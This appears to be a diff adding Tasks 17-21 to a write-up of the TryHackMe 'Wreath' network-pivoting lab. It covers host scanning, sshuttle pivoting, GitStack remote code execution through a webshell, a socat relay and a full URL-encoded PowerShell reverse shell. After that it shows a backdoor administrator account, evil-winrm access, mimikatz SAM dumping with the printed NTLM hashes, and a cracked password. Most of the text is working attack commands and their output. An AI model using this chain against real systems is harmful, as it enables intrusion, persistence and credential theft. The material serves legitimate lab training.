@@ -6,7 +6,7 @@ Difficulty: Easy
 
 Description: Learn how to pivot through a network by compromising a public facing web machine and tunnelling your traffic to access other machines in Wreath's network.
 
-## Task 1 -4
+## Task 1 - 4
 Have no questions that require an answer.
 
 ## Task 5 - Webserver Enumeration
@@ -276,4 +276,397 @@ Has no questions that require an answer.
 
 ## Task 17 - Git Server Enumeration
 
+**Excluding the out of scope hosts, and the current host (.200), how many hosts were discovered active on the network?**
 
+2
+
+```
+[root@prod-serv tmp]# ./nmap-username -sn 10.200.188.1-255 -oN scan-username
+
+Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2021-09-12 23:20 BST
+Cannot find nmap-payloads. UDP payloads are disabled.
+Nmap scan report for ip-10-200-188-1.eu-west-1.compute.internal (10.200.188.1)
+Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
+Host is up (0.00026s latency).
+MAC Address: 02:74:1D:9C:65:4F (Unknown)
+Nmap scan report for ip-10-200-188-100.eu-west-1.compute.internal (10.200.188.100)
+Host is up (0.00018s latency).
+MAC Address: 02:E6:A9:4C:30:EB (Unknown)
+Nmap scan report for ip-10-200-188-150.eu-west-1.compute.internal (10.200.188.150)
+Host is up (-0.10s latency).
+MAC Address: 02:48:97:0C:DD:D9 (Unknown)
+Nmap scan report for ip-10-200-188-250.eu-west-1.compute.internal (10.200.188.250)
+Host is up (0.00020s latency).
+MAC Address: 02:BE:E0:73:5E:69 (Unknown)
+Nmap scan report for ip-10-200-188-200.eu-west-1.compute.internal (10.200.188.200)
+Host is up.
+Nmap done: 255 IP addresses (5 hosts up) scanned in 3.74 seconds
+```
+
+We exclude host .1, .250, and .200 so that leaves us two active hosts on the network, .100 and .150
+
+**In ascending order, what are the last octets of these host IPv4 addresses? (e.g. if the address was 172.16.0.80, submit the 80)**
+
+100,150
+
+**Scan the hosts -- which one does not return a status of "filtered" for every port (submit the last octet only)?**
+
+150
+
+```
+[root@prod-serv tmp]# ./nmap-username 10.200.188.150 -oN scan-username
+
+Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2021-09-12 23:29 BST
+Unable to find nmap-services!  Resorting to /etc/services
+Cannot find nmap-payloads. UDP payloads are disabled.
+Nmap scan report for ip-10-200-188-150.eu-west-1.compute.internal (10.200.188.150)
+Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
+Host is up (-0.0043s latency).
+Not shown: 6147 filtered ports
+PORT     STATE SERVICE
+80/tcp   open  http
+3389/tcp open  ms-wbt-server
+5985/tcp open  wsman
+MAC Address: 02:48:97:0C:DD:D9 (Unknown)
+
+Nmap done: 1 IP address (1 host up) scanned in 34.64 seconds
+```
+
+**Let's assume that the other host is inaccessible from our current position in the network.**
+
+**Which TCP ports (in ascending order, comma separated) below port 15000, are open on the remaining target?**
+
+80,3389,5985
+
+**Assuming that the service guesses made by Nmap are accurate, which of the found services is more likely to contain an exploitable vulnerability?**
+
+http
+
+## Task 18 - Git Server Pivoting
+
+I choose to use the suggested sshuttle for this task.
+
+```
+┌──(root💀kali)-[/home/kali/Downloads]
+└─# sshuttle -r root@10.200.188.200 --ssh-cmd "ssh -i id_rsa" 10.200.188.0/24                                                       99 ⨯
+c : Connected to server.
+client_loop: send disconnect: Broken pipe
+c : fatal: ssh connection to server (pid 5003) exited with returncode 255
+```
+
+To fix the broken pipe we must add -x to exclude the ip we are connecting to since its on the same network
+
+```
+┌──(root💀kali)-[/home/kali/Downloads]
+└─# sshuttle -r root@10.200.188.200 --ssh-cmd "ssh -i id_rsa" 10.200.188.0/24 -x 10.200.188.200                                     99 ⨯
+c : Connected to server.
+```
+
+Now we can access the page at 10.200.188.150 and we can answer the first question from this page.
+
+![image](https://user-images.githubusercontent.com/43668197/133005311-60c1001a-25d5-49df-b281-6f726421bd54.png)
+
+**What is the name of the program running the service?**
+
+gitstack
+
+**Do these default credentials work (Aye/Nay)?**
+
+nay
+
+```
+┌──(root💀kali)-[/home/kali/Downloads]
+└─# searchsploit gitstack            
+------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                         |  Path
+------------------------------------------------------------------------------------------------------- ---------------------------------
+GitStack - Remote Code Execution                                                                       | php/webapps/44044.md
+GitStack - Unsanitized Argument Remote Code Execution (Metasploit)                                     | windows/remote/44356.rb
+GitStack 2.3.10 - Remote Code Execution                                                                | php/webapps/43777.py
+------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+Papers: No Results
+```
+
+**You will see that there are three publicly available exploits.**
+
+**There is one Python RCE exploit for version 2.3.10 of the service. What is the EDB ID number of this exploit?**
+
+43777
+
+## Task 19 - Git Server Code Review
+
+**Look at the information at the top of the script. On what date was this exploit written?**
+
+18.01.2018
+
+**Bearing this in mind, is the script written in Python2 or Python3?**
+
+python2
+
+**Just to confirm that you have been paying attention to the script: What is the name of the cookie set in the POST request made on line 74 (line 73 if you didn't add the shebang) of the exploit?**
+
+csrftoken
+
+## Task 20 - Git Server Exploitation
+
+Time to try out the script!
+
+![image](https://user-images.githubusercontent.com/43668197/133005910-772c37b8-6f6e-433f-907d-813016a105af.png)
+
+Success and its running as NT authority\system.
+
+**First up, let's use some basic enumeration to get to grips with the webshell:**
+
+**What is the hostname for this target?**
+
+git-serv
+
+```
+┌──(root💀kali)-[/home/kali/Downloads]
+└─# curl -X POST http://gitserver.thm/web/exploit-name.php -d "a=hostname"
+"git-serv
+" 
+```
+
+**What operating system is this target?**
+
+windows
+
+```
+──(root💀kali)-[/home/kali/Downloads]
+└─# curl -X POST http://gitserver.thm/web/exploit-name.php -d "a=systeminfo"
+"
+Host Name:                 GIT-SERV
+OS Name:                   Microsoft Windows Server 2019 Standard
+OS Version:                10.0.17763 N/A Build 17763
+```
+
+**What user is the server running as?**
+
+nt authority\system
+
+```┌──(root💀kali)-[/home/kali/Downloads]
+└─# curl -X POST http://gitserver.thm/web/exploit-name.php -d "a=whoami"    
+"nt authority\system
+" 
+```
+
+```
+──(root💀kali)-[/home/kali/Downloads]
+└─# curl -X POST http://gitserver.thm/web/exploit-name.php -d "a=ping -n 3 10.50.185.100"
+"
+Pinging 10.50.185.100 with 32 bytes of data:
+Request timed out.
+Request timed out.
+Request timed out.
+
+Ping statistics for 10.50.185.100:
+    Packets: Sent = 3, Received = 0, Lost = 3 (100% loss),
+" 
+```
+
+**How many make it to the waiting listener?**
+
+0
+
+To proceed further we must use the ssh credentials we have from before to login and open the port we wish to use in the firewall.
+First we check which ports are already open.
+
+```
+──(root💀kali)-[/home/kali/Downloads]
+└─# ssh -i id_rsa root@10.200.188.200
+[root@prod-serv ~]# firewall-cmd --list-all
+public (active)
+  target: default
+  icmp-block-inversion: no
+  interfaces: eth0
+  sources: 
+  services: cockpit dhcpv6-client http https ssh
+  ports: 10000/tcp
+  protocols: 
+  masquerade: no
+  forward-ports: 
+  source-ports: 
+  icmp-blocks: 
+  rich rules: 
+```
+
+And now we add a port to use.
+
+```
+[root@prod-serv ~]# firewall-cmd --zone=public --add-port 17777/tcp
+success
+[root@prod-serv ~]# firewall-cmd --list-all
+public (active)
+  target: default
+  icmp-block-inversion: no
+  interfaces: eth0
+  sources: 
+  services: cockpit dhcpv6-client http https ssh
+  ports: 10000/tcp 17777/tcp
+  protocols: 
+  masquerade: no
+  forward-ports: 
+  source-ports: 
+  icmp-blocks: 
+  rich rules: 
+  ```
+  
+Next ill grab socat as suggested.
+  
+```
+  ──(root💀kali)-[/home/kali/Downloads]
+└─# wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat    
+```
+
+And start a webserver on kali to transfer socat.
+
+```
+┌──(root💀kali)-[/home/kali/Downloads]
+└─# python3 -m http.server 80                             
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+```
+
+```
+──(root💀kali)-[/home/kali/Downloads]
+└─# ssh -i id_rsa root@10.200.188.200                                                       
+[root@prod-serv ~]# curl 10.50.185.100/socat -o /tmp/socat-username && chmod +x /tmp/socat-username
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  366k  100  366k    0     0   408k      0 --:--:-- --:--:-- --:--:--  408k
+```
+
+Move to the tmp folder and execute socat
+
+```
+[root@prod-serv tmp]# ./socat-name tcp-l:17777 tcp:10.50.185.100:1337
+```
+
+Setup nc listener
+
+```
+┌──(root💀kali)-[/home/kali/Downloads]
+└─# nc -nlvp 1337                                                                                                                    1 ⨯
+listening on [any] 1337 ...
+```
+
+Now we can use powershell reverse shells.
+
+```
+└─# curl -X POST http://10.200.188.200/web/exploit-username.php -d "a=powershell.exe%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%2710.200.188.200%27%2C17777%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22"
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>302 Found</title>
+</head><body>
+<h1>Found</h1>
+<p>The document has moved <a href="https://thomaswreath.thmweb/exploit-name.php">here</a>.</p>
+</body></html>
+```
+
+```
+┌──(root💀kali)-[/home/kali/Downloads]
+└─# curl -X POST http://10.200.188.150/web/exploit-username.php -d "a=powershell.exe%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%2710.200.188.200%27%2C17777%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22"
+```
+
+```
+┌──(root💀kali)-[/home/kali/Downloads]
+└─# nc -nlvp 1337                                                                                                                    1 ⨯
+listening on [any] 1337 ...
+connect to [10.50.185.100] from (UNKNOWN) [10.200.188.200] 39248
+whoami
+nt authority\system
+PS C:\GitStack\gitphp> 
+```
+
+We are now connected to reverse shell from the gitstack system.
+
+## Task 21 - Git Server Stabilisation & Post Exploitation
+
+First we add a new admin account so we don't have to rely on the exploit.
+
+```
+PS C:\GitStack\gitphp> net user username password /add
+The command completed successfully.
+
+PS C:\GitStack\gitphp> net localgroup Administrators username /add
+The command completed successfully.
+
+PS C:\GitStack\gitphp> net localgroup "Remote Management Users" username /add
+The command completed successfully.
+```
+
+Next we access the box with evil-winrm
+
+```
+┌──(root💀kali)-[/home/kali/Downloads]
+└─# evil-winrm -u username -p password -i 10.200.188.150                      
+
+Evil-WinRM shell v3.3
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\username\Documents> 
+```
+To connect over rdp I used the suggested xfreerdp.
+
+```
+┌──(root💀kali)-[/home/kali/Downloads]
+└─# xfreerdp /v:10.200.188.150 /u:username /p:password
+```
+Upload mimikatz.exe.
+
+```
+*Evil-WinRM* PS C:\Users\username\Documents> upload /home/kali/Downloads/mimikatz.exe C:\Users\username\Downloads\mimikatz.exe
+Info: Uploading /home/kali/Downloads/mimikatz.exe to C:\Users\username\Downloads\mimikatz.exe
+
+                                                             
+Data: 1451220 bytes of 1451220 bytes copied
+
+Info: Upload successful!
+```
+Run mimikatz and get the hases.
+
+```
+PS C:\Users\username\Desktop\x64> .\mimikatz.exe
+mimikatz # privilege::debug
+mimikatz # token::elevate
+mimikatz # lsadump::sam
+```
+
+```
+RID  : 000001f4 (500)
+User : Administrator
+  Hash NTLM: 37db630168e5f82aafa8461e05c6bbd1
+  
+RID  : 000003e9 (1001)
+User : Thomas
+Hash NTLM: 02d90eda8f6b6b06c32d5f207831101f
+```
+
+**What is the Administrator password hash?**
+
+37db630168e5f82aafa8461e05c6bbd1
+
+**What is the NTLM password hash for the user "Thomas"?**
+
+02d90eda8f6b6b06c32d5f207831101f
+
+![image](https://user-images.githubusercontent.com/43668197/133009559-2e8b6af3-238d-4769-b3a2-4bb532da73db.png)
+
+**What is Thomas' password?**
+
+i<3ruby
+
+From now on we will use evil-winrm to connect to the default admin account since ours will be wiped on reset.
+evil-winrm -u Administrator -H 37db630168e5f82aafa8461e05c6bbd1 -i IP
+
+## Task 22 - Command and Control Introduction
+
+Has no question that requires an answer.
+
+## Task 23 - 
